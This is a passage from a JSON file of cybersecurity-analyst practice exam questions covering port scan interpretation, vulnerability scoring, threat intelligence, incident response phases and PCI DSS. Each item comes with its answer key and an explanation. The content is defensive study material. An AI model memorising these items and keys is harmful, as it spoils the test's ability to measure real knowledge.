use?","o":["SAST","SAMM","DAST","PAMM"],"a":2,"e":"Dynamic application security testing (DAST) works by running programs and testing them by conducting attacks against them. SAST (static application security testing) evaluates the underlying code of an application without running it. SAMM is the Software Application Maturity Model, an OWASP initiative intended to help organizations evaluate the maturity of their code, and PAMM was made up for this question.","l":"c8-appsec","l2":"","k":"dynamic application security testing"},{"id":"pt2-7","set":"pt2","ch":5,"d":2,"q":"A port scan conducted during a security assessment shows the following results. What type of device has most likely been scanned?\n<pre>\n<code>Nmap scan report for EXAMPLE (192.168.1.79)</code>\n<code>Host is up (1.00s latency).</code>\n<code>Not shown: 992 closed ports</code>\n<code>PORT     STATE</code>\n<code>21/tcp   open</code>\n<code>23/tcp   open</code>\n<code>80/tcp   open</code>\n<code>280/tcp  open</code>\n<code>443/tcp  open</code>\n<code>515/tcp  open</code>\n<code>631/tcp  open</code>\n<code>9100/tcp open</code>\n<code>Nmap done: 1 IP address (1 host up) scanned in 124.20 seconds</code>\n</pre>","o":["A wireless access point","A server","A printer","A switch"],"a":2,"e":"Although TCP ports 21, 23, 80, and 443 are all common ports, 515, 631, and 9100 are commonly associated with printers.","l":"c5-portscan","l2":"","k":"printer port fingerprinting"},{"id":"pt2-8","set":"pt2","ch":3,"d":1,"q":"Mark is reviewing his organization’s Microsoft Entra ID logs and notes that a privileged user logged in from their home office location in San Francisco at 7:48 a.m. Two hours later, she logged in from Australia. What type of anomaly should he flag this as, and what should he do?","o":["VPN usage, and scan the remote system for vulnerabilities","Impossible travel, and call the user to ask about what they are doing","VPN usage, and scan the system using a EDR tool","Impossible travel, and immediately lock the account"],"a":3,"e":"This is considered impossible travel, as the user cannot have physically been in both locations within two hours. No VPN usage is noted, and if the organization does not specifically use or provide a VPN, this is suspicious. In circumstances where a privileged user account may be compromised, immediate account lockout is a typical response. That helps to limit the potential impact of a compromise, and the user can then be contacted in case a mistake was made.","l":"c3-cloud-social","l2":"","k":"impossible travel identity indicator"},{"id":"pt2-9","set":"pt2","ch":5,"d":2,"q":"During an Nmap scan of a network, Charles receives the following response from <code>nmap</code>. What can Charles deduce about the network segment from these results?\n<pre>\n<code>Starting Nmap 7.80 ( https://nmap.org ) </code>\n<code>Nmap done: 256 IP addresses (0 hosts up) scanned in 29.74 seconds</code>\n</pre>","o":["There are no active hosts in the network segment.","All hosts on the network segment are firewalled.","The scan was misconfigured.","Charles cannot determine if there are hosts on the network segment from this scan."],"a":3,"e":"A host that is not running any services or that has a firewall enabled that prevents responses can be invisible to <code>nmap</code>. Charles cannot determine whether there are hosts on this network segment and may want to use other means such as ARP queries, DHCP logs, and other network layer checks to determine whether there are systems on the network.","l":"c5-portscan","l2":"","k":"Nmap ignored states scan interpretation"},{"id":"pt2-10","set":"pt2","ch":3,"d":1,"q":"Oliver wants to analyze a binary file and believes that there may be relevant information that can be recovered from the contents of the file. What built-in Linux tool can he use to most effectively recover human-readable content from binary files?","o":["<code>nano</code>","<code>cat</code>","<code>strings</code>","<code>more</code>"],"a":2,"e":"The Linux <code>strings</code> command pulls human-readable strings from binary files and is frequently used for this type of analysis. Linux tools like <code>cat</code> and <code>more</code> are used to view files, but <code>strings</code> does a better job of pulling out the human-readable content. <code>nano</code> is a Linux editor for text files.","l":"c3-filesandbox","l2":"","k":"strings command binary file analysis"},{"id":"pt2-11","set":"pt2","ch":5,"d":2,"q":"During a port scan of a server, Gwen discovered that the following ports are open on the internal network. Of the services listed here, for which one does the scan <i>not</i> provide evidence that it is likely running on the server?\n<p>TCP port 25</p>\n<p>TCP port 80</p>\n<p>TCP port 110</p>\n<p>TCP port 443</p>\n<p>TCP port 1521</p>\n<p>TCP port 3389</p>","o":["Web","Database","SSH","Email"],"a":2,"e":"Web servers commonly run on ports 80 (for HTTP) and 443 (for HTTPS). Database servers commonly run on ports 1433 (for Microsoft SQL Server), 1521 (for Oracle), or 3306 (for MySQL). Port 110 is the default TCP port used for the Post Office Protocol version 3 (POP3). Remote Desktop Protocol services commonly run on port 3389. Simple Mail Transfer Protocol (SMTP) runs on port 25. There is no evidence that SSH, which uses port 22, is running on this server.","l":"c5-portscan","l2":"","k":"SSH default port 22 administration"},{"id":"pt2-12","set":"pt2","ch":4,"d":1,"q":"Selah is configuring the Malware Information Sharing Platform (MISP) to send data to her organization’s existing open source Security Onion SIEM. Which of the following is best suited to transport threat intelligence between the two platforms?","o":["An API via HTTPS","STIX via TAXII","JSON via HTTP","Text files via FTP"],"a":1,"e":"STIX and TAXII are a complementary protocol and data structure format used to share structured threat intelligence data. They’re commonly used to transfer this information between various systems as a standard. While APIs via HTTPS are also common, STIX and TAXII are specifically designed for this purpose and are broadly adopted and used. JSON via unencrypted HTTP or text files via unencrypted FTP are not typically used for security-related purposes.","l":"c4-collect","l2":"c3-tip-edr","k":"STIX and TAXII threat sharing"},{"id":"pt2-13","set":"pt2","ch":4,"d":1,"q":"Jill is evaluating her organization’s recent security efforts using the Pyramid of Pain. If the organization took action that will result in tools commonly used by a malicious actor not being available to them, what level of pain will they cause the attacker?","o":["Tough","Challenging","Annoying","Simple"],"a":1,"e":"Denying tool access to attackers is rated as “challenging” in the Pyramid of Pain. Denying TTPs is “tough,” network and host artifacts are “annoying,” and domain names are “simple.”","l":"c4-classify","l2":"","k":"Pyramid of Pain tool level"},{"id":"pt2-14","set":"pt2","ch":7,"d":2,"q":"Jorge would like to use a standardized system for evaluating the severity of security vulnerabilities. Which of the following offers this capability?","o":["CPE","CVE","CVSS","CCE"],"a":2,"e":"The Common Vulnerability Scoring System (CVSS) provides a standardized method for rating the severity of security vulnerabilities. CVE (Common Vulnerabilities and Exposures) is a list of known vulnerabilities that gives each known vulnerability a unique ID number. CPE is Common Platform Enumeration, which provides a standard way to name IT systems and products. CVE and CPE work together, identifying vulnerabilities for specific products. CCE is not a common security acronym or term.","l":"c7-cvss","l2":"","k":"CVSS standardized vulnerability severity rating"},{"id":"pt2-15","set":"pt2","ch":4,"d":1,"q":"When performing threat-hunting activities, what are cybersecurity analysts most directly seeking?","o":["Vulnerabilities","Indicators of compromise","Misconfigurations","Unpatched systems"],"a":1,"e":"The defining characteristic of threat hunting is that you are searching out compromises that have already occurred. Therefore, you are looking for indicators of compromise (IoCs). Vulnerabilities, misconfigurations, and unpatched systems are all things that vulnerability management activities, rather than threat-hunting activities, would seek to identify.","l":"c4-hunt","l2":"","k":"threat hunting indicators of compromise"},{"id":"pt2-16","set":"pt2","ch":6,"d":2,"q":"Taylor is preparing to run vulnerability scans of a web application server that his organization recently deployed for public access. He would like to understand what information is available to a potential external attacker about the system as well as what damage an attacker might be able to cause on the system. Which one of the following scan types would be least likely to provide this type of information?","o":["Internal network vulnerability scan","Port scan","Web application vulnerability scan","External network vulnerability scan"],"a":0,"e":"An internal network vulnerability scan will provide an insider’s perspective on the server’s vulnerabilities. It may provide useful information, but it will not meet Taylor’s goal of determining what an external attacker would see. A port scan is a common technique that helps attackers identify potential targets, and both web application vulnerability scans and external network vulnerability scans provides useful information to attackers about vulnerabilities they may be able to exploit.","l":"c6-config","l2":"","k":"vulnerability scan internal perspective"},{"id":"pt2-17","set":"pt2","ch":3,"d":1,"q":"While analyzing a packet capture in Wireshark, Chris finds the packet shown here. Which of the following is he unable to determine from this packet?\n<figure>\n<img alt=\"Screenshot details Wireshark packet with Ethernet, I P, T C P, and F T P layers, exposing plaintext password in PASS command.\" loading=\"lazy\" src=\"img/pt/c06un005.png\"/>\n</figure>","o":["That the username used was <code>gnome</code>","That the protocol used was FTP","That the password was <code>gnome123</code>","That the remote system was 137.30.120.40"],"a":0,"e":"FTP sends the username in a separate packet. Chris can determine that this was an FTP connection, that the password was <code>gnome123</code>, and that the FTP server was 137.30.120.40.","l":"c3-tools","l2":"","k":"Wireshark FTP packet analysis"},{"id":"pt2-18","set":"pt2","ch":11,"d":3,"q":"Rick’s organization uses an infrastructure as code methodology to deploy their key infrastructure. After a vulnerability in their containerized web servers is compromised, which of the following IaC capabilities will be most impactful from an efficiency standpoint as they work through the recovery phase?","o":["The ability to perform version control with user-level attribution of changes","The ability to store secrets using a secrets manager, thus avoiding embedded secrets","The ability to use a workflow for the review of code before it is merged into production","The ability to programmatically deploy updated versions of their validated environment quickly"],"a":3,"e":"Recovery processes rely on the ability to return to production quickly and securely. That means that the ability to programmatically deploy a new validated environment quickly is extremely valuable to the process. Version control, secrets management, and code review are useful, but they are not as critical to recovery.","l":"c11-recover","l2":"c2-infra","k":"infrastructure as code incident recovery"},{"id":"pt2-19","set":"pt2","ch":1,"d":1,"q":"Carlos has discovered that malicious actors have had access to his organization’s internal AI tool’s training data, and that the training date appears to have been modified. Which critical AI risk should he identify as the most concerning?","o":["Model poisoning","Malicious prompts","Hallucinations","AI policies"],"a":0,"e":"Carlos should be concerned about model poisoning. The attackers may have modified training data in a way that would result in the model behaving in unexpected or unwanted ways. His organization will need to review the training data and potentially revert the model or retrain it on clean data, a potentially expensive proposition. Malicious prompts are used to interact with an AI, and hallucinations result when AI responds with incorrect answers. AI policies are a governance requirement, not an AI risk.","l":"c1-ai","l2":"c7-web-ot","k":"AI model data poisoning"},{"id":"pt2-20","set":"pt2","ch":9,"d":3,"q":"Which stage of the incident response process includes activities such as adding IPS signatures to detect new attacks?","o":["Detection and analysis","Containment, eradication, and recovery","Post-incident activity","Preparation"],"a":3,"e":"Adding new signatures (prior to an incident) is part of the preparation phase because it prepares an organization to detect attacks. It does not happen in the other phases.","l":"c9-process","l2":"","k":"incident response preparation phase"},{"id":"pt2-21","set":"pt2","ch":6,"d":2,"q":"Gloria is configuring vulnerability scans for a new web server in her organization. The server is located on the screened subnet (DMZ) network, as shown here. What type of scans should Gloria configure for best results?\n<figure>\n<img alt=\"Network diagram shows an internet-connected firewall, an internal network with a database, file servers, and a screened subnet web server.\" loading=\"lazy\" src=\"img/pt/c06un006.png\"/>\n</figure>","o":["Gloria should not scan servers located in the screened subnet (DMZ).","Gloria should perform only internal scans of the server.","Gloria should perform only external scans of the server.","Gloria should perform both internal and external scans of the server."],"a":3,"e":"For best results, Gloria should combine both internal and external vulnerability scans because this server has both public and private IP addresses. The external scan provides an “attacker’s eye view” of the web server, while the internal scan may uncover vulnerabilities that would be exploitable only by an insider or an attacker who has gained access to another system on the network.","l":"c6-config","l2":"","k":"internal and external scan perspectives"},{"id":"pt2-22","set":"pt2","ch":6,"d":2,"q":"Susan is planning her vulnerability scanning program and knows that her datacenter, IoT, and business networks are on different VLANs with firewalls between them. What strategy is the most secure option to deal with segmentation like this?","o":["Allow a central scanner located in the datacenter to scan across VLANs by creating appropriate firewall rules.","Scan from outside the organization to simulate external threats.","Deploy scanners in each VLAN to scan systems found there.","Periodically connect a laptop to each VLAN to conduct scans as needed."],"a":2,"e":"Placing scanners in each VLAN constrains the risk of a compromise to the VLAN they share while providing a view “inside” of security devices placed at network boundaries. While this is more expensive, it balances risk and cost. Allowing the broad range of traffic that a scanner requires through security devices across all of the organization’s VLANs creates a potential security risk. Scanning from outside is useful but does not provide a full view, particularly for protected VLANs that aren’t exposed to the outside world. Manually connecting a laptop is not a sustainable practice in most environments.","l":"c6-config","l2":"","k":"distributed vulnerability scanner deployment"},{"id":"pt2-23","set":"pt2","ch":5,"d":2,"q":"Jim’s nmap port scan of a remote system showed the following list of ports. What operating system is the remote system most likely running?\n<pre>\n<code>PORT     STATE SERVICE</code>\n<code>80/tcp   open  http</code>\n<code>135/tcp  open  msrpc</code>\n<code>139/tcp  open  netbios-ssn</code>\n<code>445/tcp  open  microsoft-ds</code>\n<code>902/tcp  open  iss-realsecure</code>\n<code>912/tcp  open  apex-mesh</code>\n<code>3389/tcp open  ms-wbt-server</code>\n</pre>","o":["Windows","Linux","An embedded OS","macOS"],"a":0,"e":"TCP 135, 139, and 445 are all common Windows ports. The addition of 3389, the remote desktop port for Windows, makes it most likely that this is a Windows server.","l":"c5-portscan","l2":"","k":"Windows OS port fingerprinting"},{"id":"pt2-24","set":"pt2","ch":6,"d":2,"q":"Helen is reviewing the output from a Trivy vulnerability scan, shown here. What concern would she have needed to raise if the CVE-2018-20843 vulnerability had not been fixed?\n<figure>\n<img alt=\"Table details Python 3.4 Alpine vulnerabilities total 37, listing C V E severity, status, installed and fixed versions for expat, libbz 2.\" loading=\"lazy\" src=\"img/pt/c06un007.png\"/>\n</figure>","o":["DNS poisoning","Denial of service","SQL injection","A zero-day attack"],"a":1,"e":"Helen knows that a parser consuming a high amount of resources creates the potential for a denial-of-service condition. Fortunately, this issue is listed as “fixed,” as it was a high severity issue. There is no indication of DNS poisoning, SQL injection, or a zero-day attack, just the high resource usage for this specific vulnerability.","l":"c6-tools","l2":"c7-server-network","k":"Trivy container vulnerability scan"},{"id":"pt2-25","set":"pt2","ch":3,"d":1,"q":"As part of her duties as a security operations center (SOC) analyst, Emily is tasked with monitoring intrusion detection system (IDS) sensors that cover her employer’s corporate headquarters network. During her shift, Emily’s IDS reports that a network scan has occurred from a system with IP address 10.1.1.19 on the organization’s unauthenticated guest wireless network aimed at systems on an external network. What should Emily’s first step be?","o":["Report the event to the impacted third parties.","Report the event to law enforcement.","Check the system’s MAC address against known assets.","Check authentication logs to identify the logged-in user."],"a":2,"e":"In most organizations, Emily’s first action should be to verify that the system is not one that belongs to the organization by checking it against her organization’s asset inventory. If the system is a compromised system on the wrong network, she or her team will need to address it. In most jurisdictions, there is no requirement to notify third parties or law enforcement of outbound scans, and since the guest wireless is specifically noted as being unauthenticated, there will not be authentication logs to check.","l":"c3-network","l2":"c5-portscan","k":"rogue device detection and identification"},{"id":"pt2-26","set":"pt2","ch":8,"d":2,"q":"Sai works in an environment that is subject to the Payment Card Industry Data Security Standard (PCI DSS). He realizes that technical constraints prevent the organization from meeting a specific PCI DSS requirement and wants to implement a compensating control. Which one of the following statements is <i>not</i> true about proper compensating controls?","o":["The control must include a clear audit mechanism.","The control must meet the intent and rigor of the original requirement.","The control must provide a similar level of defense as the original requirement provides.","The control must be above and beyond other requirements."],"a":0,"e":"The PCI DSS compensating control procedures do not require that compensating controls have a clearly defined audit mechanism, although this is good security practice. They do require that the control meet the intent and rigor of the original requirement, provide a similar level of defense as the original requirement, and be above and beyond other requirements.","l":"c8-governance","l2":"c6-requirements","k":"PCI DSS compensating control criteria"},{"id":"pt2-27","set":"pt2","ch":2,"d":1,"q":"Lou recently scanned a web server in his environment and received the vulnerability report shown here. What action can Lou take to address this vulnerability?\n<figure>\n<img alt=\"Screenshot details severity 2 S S L certificate signature verification failed vulnerability with detections, impact, and threat details.\" loading=\"lazy\" src=\"img/pt/c06un008.png\"/>\n</figure>","o":["Configure TLS.","Replace the certificate.","Unblock port 443.","Block port 80."],"a":1,"e":"This error indicates that the digital certificate presented by the server is not valid. Lou should replace the certificate with a certificate from a trusted certificate authority (CA) to correct the issue. TLS is configured and presenting the certificate, and is properly using TCP 443. Blocking port 80 won’t resolve this issue.","l":"c2-crypto","l2":"c7-server-network","k":"untrusted SSL certificate remediation"},{"id":"pt2-28","set":"pt2","ch":11,"d":3,"q":"Which of the following factors is <i>not</i> typically considered when determining whether evidence should be retained?","o":["Media life span","Likelihood of civil litigation","Organizational retention policies","Likelihood of criminal prosecution"],"a":0,"e":"Incident data should be retained as necessary regardless of media life span. Retention is often driven by the likelihood of civil or criminal action, as well as by organizational standards.","l":"c11-recover","l2":"c9-process","k":"post-incident evidence retention factors"},{"id":"pt2-29","set":"pt2","ch":7,"d":2,"q":"Cody wants to explain the differences between CVSS and EPSS to his organization’s leadership. Which of the following most accurately describes the differences between the two?","o":["EPSS is scored by the organization, and CVSS is scored by a trusted third party.","EPSS scores the likelihood of exploitation, whereas CVSS scores the potential impact of the vulnerability.","CVSS scores the likelihood of exploitation, and EPSS scores the potential impact of the vulnerability.","EPSS is scored by a trusted third party and CVSS is scored by the organization."],"a":1,"e":"EPSS, the Exploitability Prediction Scoring System, scores the likelihood of exploitation, whereas CVSS explains the severity of the impact of the vulnerability. Neither is scored by internal organizations.","l":"c7-validate","l2":"c7-cvss","k":"CVSS versus EPSS differences"},{"id":"pt2-30","set":"pt2","ch":7,"d":2,"q":"Niesha discovered the vulnerability shown here on a server running in her organization. What would be the best way for Niesha to resolve this issue?\n<figure>\n<img alt=\"Screenshot details severity 4 Open S S H vulnerability C V E 2013-4548 with threat, impact, solution, compliance, malware, and results.\" loading=\"lazy\" src=\"img/pt/c06un009.png\"/>\n</figure>","o":["Disable the use of AES-GCM.","Upgrade OpenSSH.","Upgrade the operating system.","Update antivirus signatures."],"a":1,"e":"The best way to resolve this issue would be to upgrade OpenSSH, as stated in the solution section of the report. Disabling the use of AES-GCM is an acceptable workaround, but upgrading to a more current version of OpenSSH is likely to address additional security issues not described in this particular vulnerability report. There is no indication that an operating system upgrade would correct the problem. The vulnerability report states that there is no malware associated with this vulnerability, so antivirus signature updates would not correct it.","l":"c7-server-network","l2":"c6-remediation","k":"OpenSSH vulnerability patch remediation"},{"id":"pt2-31","set":"pt2","ch":8,"d":2,"q":"Alicia has been assigned to conduct a security review of her organization’s datacenter. When she arrives, she notes that there is a security guard who requires her to sign in and a lock that requires her to present her ID card. How should she classify these controls?","o":["The ID card is an administrative control, and the security guard is a physical security control.","The ID card is a technical control, and the guard is an administrative control.","The security guard is an administrative control, and the lock is a physical control.","The security guard and lock are both technical controls."],"a":2,"e":"The security guard requires her to sign in, an administrative process. The lock is a physical control; she cannot gain access without opening it. This can be tricky—the guard and lock also have elements of a physical control and a technical control as well, but their primary components are what Alicia should note here.","l":"c8-controls","l2":"","k":"security control classification types"},{"id":"pt2-32","set":"pt2","ch":9,"d":3,"q":"Which of the following is <i>not</i> one of the four features of the Diamond Model?","o":["Adversary","Technique","Capability","Victim"],"a":1,"e":"The Diamond Model includes four interconnected features: the adversary, their capability, the infrastructure, and the victim. It doesn’t include technique.","l":"c9-frameworks","l2":"","k":"Diamond Model core features"},{"id":"pt2-33","set":"pt2","ch":9,"d":3,"q":"Deleting malicious applications occurs in what phase of the incident response process?","o":["Detection","Containment","Eradication","Recovery"],"a":2,"e":"The eradication stage of incident response focuses on removing malicious tools and artifacts to prevent attackers from using them. It requires detection to have occurred, and often happens after containment when systems are isolated or removed from the network to prevent further attacks. Recovery actions may include wiping machines and restoring them or using other techniques to ensure systems are in a known good state before they return to service.","l":"c9-process","l2":"c11-recover","k":"incident response eradication phase"},{"id":"pt2-34","set":"pt2","ch":10,"d":3,"q":"Bharath is preparing the root cause analysis for a recent incident, and wants to identify which of a series of events was the first to occur. What analysis step will be most useful in this process?","o":["Building a timeline","Conducting triage","Preserving chain of custody","Ensuring data preservation"],"a":0,"e":"Building a timeline is often very helpful when conducting root cause analysis. A timeline can help to identify the initial compromise or malicious activity, which can then be used to identify the root cause of the issue. Triage is used to prioritize incident response actions. Preservation, either data preservation or a chain of custody, is both useful for legal and law enforcement action.","l":"c10-analysis","l2":"c12-ir-report","k":"incident forensic timeline analysis"},{"id":"pt2-35","set":"pt2","ch":12,"d":4,"q":"Contractual agreements, organizational governance, business process interruption concerns, and the potential for degraded functionality are all examples of what?","o":["Stakeholder involvement","Inhibitors to remediation","Top risks","Key performance indicators"],"a":1,"e":"Common inhibitors to remediation include contractual agreements, organizational governance, business process interruption concerns, the potential for degraded functionality, legacy and proprietary systems, and patch availability. Stakeholder involvement is critical to many of these, but not all of them. Each may create risks, but are not themselves all top risks, and key performance indicators (KPIs) like time to patch are more likely to be influenced by these.","l":"c12-vuln-report","l2":"","k":"vulnerability remediation inhibitors"},{"id":"pt2-36","set":"pt2","ch":4,"d":1,"q":"Jessica is performing data enrichment for her security operations process by combining ATT&amp;CK mappings with data from an open source intelligence feed that she already has. What will this allow her to do?","o":["Add IP address mappings to threat data she already has.","Understand behaviors in addition to IoC data.","Build better SIEM rules using predictive IoCs.","Counter fast-flux DNS based on past adversary behavior."],"a":1,"e":"Mapping to ATT&amp;CK to existing IoC data will help Jessica match behaviors to IoCs, allowing for better prediction of what attackers might do. IP address mappings are in her existing data; she is adding ATT&amp;CK mappings, which do not provide IoC data like IP addresses. ATT&amp;CK typically won’t help Jessica build better SIEM rules, but it may help better categorize attacks. Fast-flux DNS is built around rapid changes, so predicting by adding ATT&amp;CK categorizations is not a technique that is likely to work.","l":"c4-classify","l2":"c1-efficiency","k":"MITRE ATT&CK data enrichment"},{"id":"pt2-37","set":"pt2","ch":5,"d":2,"q":"What information can be gathered by observing the distinct default values of the following TCP/IP fields during reconnaissance activities: initial packet size, initial TTL, window size, maximum segment size, and flags?","o":["The target system’s TCP version.","The target system’s operating system.","The target system’s MAC address.","These fields are useful only for packet analysis."],"a":1,"e":"Operating system fingerprinting relies on the differences between how each operating system (and sometimes OS versions) handles and sets various TCP/IP fields, including initial packet size, initial TTL, window size, maximum segment size, and the <code>don't fragment</code>, <code>sackOK</code>, and <code>nop</code> flags.","l":"c5-portscan","l2":"","k":"TCP/IP operating system fingerprinting"},{"id":"pt2-38","set":"pt2","ch":1,"d":1,"q":"Brooke would like to find a technology platform that automates workflows across a variety of security tools, including the automated response to security incidents. What category of tool best meets this need?","o":["SIEM","NIPS","SOAR","DLP"],"a":2,"e":"Although any of these tools may provide some security automation capability, the purpose of a security orchestration, automation, and response (SOAR) platform is to perform this type of automation across other solutions.","l":"c1-efficiency","l2":"","k":"SOAR security workflow automation"},{"id":"pt2-39","set":"pt2","ch":1,"d":1,"q":"Miro wants to compare a variety of artifacts, including scripts, configuration files, and logs that he has gathered as part of his incident investigation. Which of the following will provide the greatest flexibility and insight for his analysis process?","o":["AI","Hashing","The strings utility","A forensic duplicator"],"a":0,"e":"Using AI is an increasingly common option for complex analysis tasks. It can analyze and compare multiple file types while helping to draw conclusions or highlight important data. Hashing files is useful when checking to see if two files match, but it does not provide deeper analysis. STRINGS pulls human-readable text from binary files, but does not provide deeper analysis. Forensic tools may have additional capabilities built in, but duplicators simply clone drives or other media.","l":"c1-ai","l2":"","k":"AI incident artifact analysis"},{"id":"pt2-40","set":"pt2","ch":3,"d":1,"q":"After receiving complaints about a system on Anastasia’s network not performing correctly, she decides to investigate the issue by capturing traffic with Wireshark. The captured traffic is shown here. What type of issue is Anastasia most likely seeing?\n<figure>\n<img alt=\"Screenshot depicts Wireshark capture listing repeated T C P-S Y N packets from 10.0.2.11 to 10.0.2.15 on port 80, indicating S Y N flood.\" loading=\"lazy\" src=\"img/pt/c06un010.png\"/>\n</figure>","o":["A link failure","A failed three-way handshake","A DDoS","A SYN flood"],"a":3,"e":"The repeated SYN packets are likely a SYN flood that attempts to use up resources on the target system. A failed three-way handshake might initially appear similar but will typically not show this volume of attempts. A link failure would not show traffic from a remote system, and a DDoS would involve more than one system sending traffic.","l":"c3-network","l2":"","k":"TCP SYN flood attack"},{"id":"pt2-41","set":"pt2","ch":5,"d":2,"q":"Which of the following is not commonly used as part of device fingerprinting?","o":["Operating system identification","Browser identification","Installed software identification","User accounts"],"a":3,"e":"Device fingerprinting relies on things that are likely to help identify the system, including OS versions and patch levels, installed software, screen resolution, time zone, MAC addresses, and similar items. User account information is not typically able to be identified through these techniques.","l":"c5-portscan","l2":"","k":"device fingerprinting attributes"},{"id":"pt2-42","set":"pt2","ch":7,"d":2,"q":"Luis wants to use a third-party rating to describe how exploitable a vulnerability is. Which of the following standardized scoring systems should he use?","o":["CVE","CVSS","EPSS","EVE"],"a":2,"e":"EPSS, or the Exploitability Prediction Scoring System, is used to measure the likelihood of exploitability. CVE is used to provide a common numbering system for vulnerabilities, CVSS scores the severity of them, and EVE is not a scoring system.","l":"c7-validate","l2":"","k":"EPSS exploitability scoring"},{"id":"pt2-43","set":"pt2","ch":6,"d":2,"q":"Peter is designing a vulnerability scanning program for the large chain of retail stores where he works. The store operates point-of-sale terminals in its retail stores as well as an e-commerce website. Which one of the following statements about PCI DSS compliance is <i>not</i> true?","o":["Peter’s company must hire an approved scanning vendor to perform vulnerability scans.","The scanning program must include, at a minimum, weekly scans of the internal network.","The point-of-sale terminals and website both require vulnerability scans.","Peter may perform some required vulnerability scans on his own."],"a":1,"e":"PCI DSS requires scanning on at least a quarterly basis and after any significant changes. Weekly scanning is a best practice but is not required by the standard. Peter must hire an approved scanning vendor to perform the required quarterly external scans but may conduct the internal scans himself. All systems in the cardholder data environment, including both the website and point-of-sale terminals, must be scanned.","l":"c6-requirements","l2":"","k":"PCI DSS vulnerability scan frequency"},{"id":"pt2-44","set":"pt2","ch":7,"d":2,"q":"Rachel discovered the vulnerability shown here when scanning a web server in her organization. Which one of the following approaches would best resolve this issue?\n<figure>\n<img alt=\"Screenshot shows severity 4 Microsoft I I S server X S S elevation of privilege vulnerability with C V E-I D 2017-0055 and threat details.\" loading=\"lazy\" src=\"img/pt/c06un011.png\"/>\n</figure>","o":["Patching the server","Performing input validation","Adjusting firewall rules","Rewriting the application code"],"a":0,"e":"The vulnerability description mentions that this is a cross-site scripting (XSS) vulnerability. Normally, XSS vulnerabilities are resolved by performing proper input validation in the web application code. However, in this particular case, the XSS vulnerability exists within Microsoft IIS server itself and not in a web application. Therefore, it requires a patch from Microsoft to correct it.","l":"c7-web-ot","l2":"c8-sdlc","k":"cross-site scripting vulnerability remediation"},{"id":"pt2-45","set":"pt2","ch":5,"d":2,"q":"What <code>nmap</code> feature is enabled with the <code>-O</code> flag?","o":["OS detection","Online/offline detection","Origami attack detection","Origination port validation"],"a":0,"e":"The <code>-O</code> flag enables operating system (OS) detection for <code>nmap</code>.","l":"c5-portscan","l2":"","k":"Nmap OS detection flag"},{"id":"pt2-46","set":"pt2","ch":12,"d":4,"q":"Jose is working with his manager to implement a vulnerability management program for his company. His manager tells him that he should focus on remediating critical and high-severity risks to externally accessible systems. He also tells Jose that the organization does not want to address risks on systems without any external exposure or risks rated medium or lower. Jose disagrees with this approach and believes that he should also address critical and high-severity risks on internal systems. How should he handle the situation?","o":["Jose should recognize that his manager has made a decision based on the organization’s risk appetite and should accept it and carry out his manager’s request.","Jose should discuss his opinion with his manager and request that the remediation criteria be changed.","Jose should ask his manager’s supervisor for a meeting to discuss his concerns about the manager’s approach.","Jose should carry out the remediation program in the manner that he feels is appropriate because it will address all of the risks identified by the manager as well as additional risks."],"a":1,"e":"The most appropriate step for Jose to take is to discuss his opinion with his manager and see whether the manager is willing to change the guidelines. As a security professional, it is Jose’s ethical responsibility to share his opinion with his manager. It would not be appropriate for Jose to act against his manager’s wishes. Jose should also not ask to speak with his manager’s supervisor until he has had an opportunity to discuss the issue thoroughly with his manager.","l":"c12-vuln-report","l2":"c6-remediation","k":"vulnerability remediation policy SLAs"},{"id":"pt2-47","set":"pt2","ch":3,"d":1,"q":"Susan needs to test thousands of submitted binaries. She needs to ensure that the applications do not contain malicious code. What technique is best suited to this need?","o":["Sandboxing","Implementing a honeypot","Decompiling and analyzing the application code","Fagan testing"],"a":0,"e":"Susan’s best option is to use an automated testing sandbox that analyzes the applications for malicious or questionable behavior. While this may not catch every instance of malicious software, the only other viable option is decompiling the applications and analyzing the code, which would be incredibly time-consuming. Since she doesn’t have the source code, Fagan inspection won’t work (and would take a long time too), and running a honeypot is used to understand hacker techniques, not to directly analyze application code.","l":"c3-filesandbox","l2":"","k":"automated malware analysis sandboxing"},{"id":"pt2-48","set":"pt2","ch":8,"d":2,"q":"Michelle’s organization has recently undergone a penetration test during which multiple issues were identified. Some of the issues would be costly to remediate and are relatively difficult to exploit. Executive leadership has opted to accept the risks, if they can be categorized as a moderate operational risk. What term best describes this?","o":["Risk assessment","Risk transfer","Risk appetite","Risk containment"],"a":2,"e":"The leadership in Michelle’s organization has described their risk appetite for the risks identified in the penetration test. Risk assessment is done to determine the probability and impact of risks which can help to determine risk levels and if they fit organizational risk appetite. Risk transfer is typically done via contracts, such as by purchasing insurance. Risk containment occurs when risks are moderated through some form of action.","l":"c8-analyzing","l2":"c8-managing","k":"organizational risk appetite"},{"id":"pt2-49","set":"pt2","ch":6,"d":2,"q":"Rhonda recently configured new vulnerability scans for her organization’s datacenter. Completing the scans according to current specifications requires that they run all day, every day. After the first day of scanning, Rhonda received complaints from administrators of network congestion during peak business hours. How should Rhonda handle this situation?","o":["Adjust the scanning frequency to avoid scanning during peak times.","Request that network administrators increase available bandwidth to accommodate scanning.","Inform the administrators of the importance of scanning and ask them to adjust the business requirements.","Ignore the request because it does not meet security objectives."],"a":0,"e":"The most reasonable response is for Rhonda to adjust the scanning parameters to avoid conflicts with peak business periods. She could ask for additional network bandwidth, but this is likely an unnecessary expense. Adjusting the business requirements is not a reasonable response, as security objectives should be designed to add security in a way that allows the business to operate efficiently, not the other way around. Ignoring the request would be very harmful to the business relationship.","l":"c6-requirements","l2":"c6-remediation","k":"vulnerability scan off-peak scheduling"},{"id":"pt2-50","set":"pt2","ch":11,"d":3,"q":"After restoring a system from 30-day-old backups after a compromise, administrators at Piper’s company return the system to service. Shortly after that, Piper detects similar signs of compromise again. Why is restoring a system from a backup problematic in many cases?","o":["Backups cannot be tested for security issues.","Restoring from backup may reintroduce the original vulnerability.","Backups are performed with the firewall off and are insecure after restoration.","Backups cannot be properly secured."],"a":1,"e":"When restoring from a backup after a compromise, it is important to ensure that the flaw that allowed attackers in is patched or otherwise remediated. In many environments, backups can be restored to a protected location where they can be patched, validated, and tested before they are restored to service.","l":"c11-recover","l2":"","k":"post-restoration backup vulnerability remediation"},{"id":"pt2-51","set":"pt2","ch":11,"d":3,"q":"Captured network traffic from a compromised system shows it reaching out to a series of five remote IP addresses that change on a regular basis. Since the system is believed to be compromised, the system’s Internet access is blocked, and the system is isolated to a quarantine VLAN.\n<p>When forensic investigators review the system, no evidence of malware is found. Which of the following scenarios is most likely?</p>","o":["The system was not infected, and the detection was a false positive.","The beaconing behavior was part of a web bug.","The beaconing behavior was due to a misconfigured application.","The malware removed itself after losing network connectivity."],"a":3,"e":"Recurring beaconing behavior 